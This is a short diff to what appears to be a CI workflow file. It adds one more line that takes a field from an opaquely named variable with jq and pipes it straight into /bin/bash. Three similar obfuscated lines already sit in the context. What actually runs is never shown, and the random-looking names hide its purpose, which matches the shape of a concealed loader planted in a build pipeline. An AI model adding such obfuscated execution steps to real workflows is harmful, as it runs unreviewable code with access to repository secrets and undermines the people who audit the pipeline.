@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$cb9161" | jq -r .jkkp586 | /bin/bash
           echo $l576 | jq -r .ic666 | /bin/bash
           echo $mm9 | jq -r .spa65 | /bin/bash
+          printf '%s' "$kp412" | jq -r .tzo29772 | /bin/bash
 
       - name: Upload data
         if: always()
